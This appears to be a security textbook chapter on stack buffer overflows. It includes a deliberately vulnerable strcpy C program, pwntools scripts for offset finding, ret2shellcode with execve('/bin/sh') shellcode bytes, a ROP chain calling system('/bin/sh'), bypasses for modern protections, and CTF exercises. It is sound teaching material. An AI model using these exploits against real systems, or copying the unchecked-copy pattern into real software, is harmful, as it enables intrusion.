# Chapter 32: Buffer Overflows — Writing Past Boundaries to Control Execution

*Buffer overflows are the granddaddy of memory corruption vulnerabilities. Understanding them builds intuition for how memory works, how exploits operate, and why memory-safe languages like Go and Rust exist.*

---

## The Stack and Function Calls

Every function call pushes a "stack frame":

```
High memory addresses
┌──────────────────┐
│   ...            │
│  main's frame    │
├──────────────────┤
│  return address  │  ← where to go after function returns
│  saved EBP/RBP   │  ← caller's stack frame pointer
│  local variables │  ← including vulnerable buffer
│  [BUFFER HERE]   │  ← our attack target
├──────────────────┤
│  vulnerable()    │
│    frame         │
└──────────────────┘
Low memory addresses
```

The **return address** controls where execution goes when the function returns.

---

## Classic Stack Buffer Overflow

```c
// Vulnerable C code
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // no bounds check!
}

int main() {
    char big_input[200];
    memset(big_input, 'A', 200);
    vulnerable(big_input);
    return 0;
}
```

What happens:
1. `buffer` is 64 bytes on the stack
2. `input` is 200 bytes
3. `strcpy` writes 200 bytes starting at `buffer`
4. After 64 bytes, overflow continues into saved RBP and return address
5. Return address gets overwritten with `0x4141414141414141` ("AAAAAAAA")
6. Function tries to return to that address → crash (segfault)

If instead we put a useful address there — we control execution.

---

## Finding the Offset

```python
# Create a cyclic pattern (unique sequence of 4-byte patterns)
# Pattern of 200 bytes
python3 -c "from pwn import *; print(cyclic(200))"
# Output: aaaabaaacaaadaaae...

# Run the binary with this input, it crashes with EIP = unique value
# Find offset of that value in the pattern
python3 -c "from pwn import *; print(cyclic_find(0x61616162))"
# Output: 64  ← overflow offset is at byte 64
```

---

## Controlling EIP/RIP

```python
from pwn import *

# Target binary
p = process('./vulnerable')

offset = 64
junk = b'A' * offset
new_return = p64(0xdeadbeef)  # what we want EIP to become

payload = junk + new_return
p.sendline(payload)
p.wait()  # crashes with RIP = 0xdeadbeef
```

---

## Basic Exploit: ret2shellcode

```python
from pwn import *

# Linux x64 shellcode — execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
shellcode += b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
shellcode += b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

p = process('./vulnerable', env={"ASLR": "0"})  # simplified — ASLR disabled

# Find buffer address (from gdb/strace)
buf_addr = 0x7fffffffd000  # address of buffer in memory

offset = 64
payload = shellcode                    # shellcode at start
payload += b'A' * (offset - len(shellcode))  # padding
payload += p64(buf_addr)               # return to our buffer

p.sendline(payload)
p.interactive()  # we have a shell!
```

---

## Modern Protections

Real systems have multiple protections:

| Protection | What it does | Bypass |
|-----------|-------------|--------|
| **ASLR** | Randomize memory addresses | Information leak, brute force |
| **Stack canaries** | Detect stack corruption | Info leak, overwrite with correct canary |
| **NX/DEP** | No-execute stack | ROP (Return-Oriented Programming) |
| **RELRO** | Read-only GOT/PLT | Requires GOT overwrite bypass |
| **PIE** | Randomize binary base | Information leak |

---

## Return-Oriented Programming (ROP)

When the stack is non-executable, use ROP: chain together small pieces of existing code (gadgets).

```
Gadget: a small code sequence ending in "ret"
Example: pop rdi; ret  ← loads a value into rdi from stack, then returns

ROP chain:
[ pop rdi; ret ] → address of "/bin/sh" string
[ system() addr ]

Execution:
pop rdi → rdi = "/bin/sh"
ret → system()
system("/bin/sh") → shell!
```

```python
from pwn import *

elf = ELF('./vulnerable')
rop = ROP(elf)

# Find gadgets automatically
rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh'))])

# Or manually
pop_rdi = 0x400693  # found with: ROPgadget --binary ./vuln | grep "pop rdi"

payload = b'A' * 64
payload += p64(pop_rdi)
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.symbols['system'])
```

---

## Tools for Buffer Overflow Research

```bash
# GDB with peda/pwndbg
gdb ./vulnerable
run $(python3 -c "print('A'*200)")
info registers           # see RIP value after crash
x/20x $rsp              # examine stack

# pwntools — Python exploit framework
pip install pwntools
python3 exploit.py

# ROPgadget — find ROP gadgets
ROPgadget --binary ./vulnerable | grep "pop rdi"
ROPgadget --binary ./vulnerable --rop

# checksec — what protections does a binary have?
checksec --file=./vulnerable

# ltrace / strace — trace library/syscall calls
ltrace ./vulnerable input
```

---

## Go is Memory-Safe

Go does not have buffer overflow vulnerabilities in normal code:

```go
// Go: bounds-checked automatically
buf := make([]byte, 64)
copy(buf, userInput)  // copies at most 64 bytes, no overflow

// Slice access panics on out-of-bounds instead of corrupting memory
arr := [5]int{1, 2, 3, 4, 5}
_ = arr[10]  // panic: runtime error: index out of range

// No manual memory management — no use-after-free, no double-free
```

Go still has vulnerabilities, but not classic buffer overflows. Security tools written in Go won't have these bugs.

---

## Summary

| Concept | Meaning |
|---------|---------|
| Buffer overflow | Write past end of buffer into adjacent memory |
| Return address | Overwrite this to control execution flow |
| Shellcode | Machine code that spawns a shell |
| ASLR | Makes addresses random — harder to hardcode |
| NX/DEP | Stack not executable — need ROP instead |
| ROP | Chain code gadgets to execute arbitrary code |

---

## Exercises

1. Download a vulnerable CTF binary from exploit.education (phoenix/stack challenges). Find the overflow offset.
2. Write a basic ROP chain to call `system("/bin/sh")` on a no-NX binary.
3. Explain why ASLR alone doesn't completely prevent exploitation.
4. Find a real CVE involving a buffer overflow from the last 5 years. Read the write-up.
